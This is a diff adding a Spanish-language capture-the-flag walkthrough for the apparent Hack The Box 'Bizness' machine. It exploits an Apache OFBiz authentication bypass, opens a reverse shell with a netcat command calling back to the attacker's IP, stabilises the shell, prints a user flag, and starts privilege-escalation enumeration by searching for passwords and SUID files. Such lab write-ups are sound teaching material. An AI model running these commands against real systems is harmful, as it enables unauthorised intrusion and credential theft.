@@ -183,5 +183,117 @@ git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/
 
 Y usamos la siguiente herramienta para saber si es vulnerable o no 
 ```
-python3 xdetection.py --url https://bizness.htb
+python3 xdetection.py --url https://bizness.htb --cmd 'whoami'
 ```
+
+Si lo ejecutamos de esta manera de primera no observaremos nada, pero si nos abrimos otra terminal y nos ponemos en escucha con `tcpdump` 
+```sh
+tcpdump -i tun0 icmp -n  
+```
+
+Ejecutamos el siguiente exploit
+```
+python3 exploit.py --url https://bizness.htb --cmd 'ping -c 1 10.10.16.5'
+```
+
+Si obtenemos respuesta con ping significa que efectivamente funciono el exploit 
+
+Ahora la idea para ganar acceso al sistema seria la siguiente
+```sh
+nc -nlvp 443
+```
+
+```sh
+python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.5 443'
+```
+
+Y listo con esto ya estariamos dentro de la maquina `10.10.11.252` 
+Una vez dentro de la maquina realizamos la siguiente instucción para obtener una bash interactiva
+```
+script /dev/null -c bash 
+```
+
+Ahora salimos creamos una consola interactiva con la cual operar sin miedo que cuando hagamos `Ctrl + z` la shell se nos muera y estar de forma interactiva operando 
+```
+stty raw -echo; fg 
+```
+```
+	reset xterm
+```
+
+Si no les funciona el xterm com `Ctrl + l` para limpiar, pueden utilizar 
+```
+export TERM=xterm
+```
+
+Al igual que cuando tratamos de usar `nano` vemos que las proporciones no son las correctas, para ello lo podemos solucionar con :
+```
+stty size
+24 80
+```
+
+Consola normal 
+```
+stty size 
+44 184
+``` 
+
+En estos ejemplos nos damos cuenta que son diferentes tamaños asi que hacemos un 
+```
+stty rows 44 columns 184
+```
+Para ajustarle al tamaño de nuestra maquina 
+
+Ahora si salimos a la raiz con `cd` y hacemos un `ls` encontraremos la primera flag que seria como usuario no privilegiado
+```bash
+ofbiz@bizness:/opt/ofbiz$ pwd
+/opt/ofbiz
+ofbiz@bizness:/opt/ofbiz$ cd
+ofbiz@bizness:~$ ls
+user.txt
+ofbiz@bizness:~$ cat user.txt
+d1e4d02974170faf3940d1c5f12f7c15
+```
+
+Ahora debemos elevar nuestro privilegio para obtener la bandera como `root.txt` 
+
+Si realizamos un `id` nos daremos cuenta que no pertenecemos a ningun equipo en especial para poder elevar nuestro privilegio, ademas podemos hacer un `lsb_release -a` para saber en que tipo de debian nos econtrabamos 
+Y para saber el tipo de kernel `uname -a` y podriamos buscar por la pagina permisos `suid` cuyo propitario sea `root` el cual lo podamos explotar para elevar nuestro privilegio;
+```
+find / -perm -4000 2>/dev/null
+```
+pero de principio no nos encontramos nada que podamos explotar 
+
+Podriamos buscar capabilities 
+```
+get -r 2>/dev/null 
+```
+Y solo encontramos la ruta ping que no seria de gran ayuda asi que seguimos 
+
+Ahora intentamos grepear por la palabra `passwd` desde la raiz de `ofbiz` en la ruta `/opt/ofbiz` 
+```
+grep -ril "password"
+```
+
+Y encontraremos unas rutas interesantes que termian con `.dat`  con información importante 
+Si hacemos un `file` a una ruta veremos que contiene información data 
+```
+file runtime/data/derby/ofbiz/seg0/c6010.dat
+```
+
+Y ahora ingresamos para ver que contiene
+```
+cd runtime/data/derby/ofbiz/seg0/
+```
+Aqui veremos varios archivos y veremos un archivo en especifico el cual dice `README_DO_NOT_TOUCH_FILES.txt` 
+Con el siguiente mensaje :
+```
+# *************************************************************************
+# ***              DO NOT TOUCH FILES IN THIS DIRECTORY!                ***
+# *** FILES IN THIS DIRECTORY ARE USED BY THE DERBY DATABASE TO STORE   *** 
+# *** USER AND SYSTEM DATA. EDITING, ADDING, OR DELETING FILES IN THIS  ***
+# *** DIRECTORY WILL CORRUPT THE ASSOCIATED DERBY DATABASE AND MAKE     ***
+# *** IT NON-RECOVERABLE.                                               ***
+# *************************************************************************
+```
+
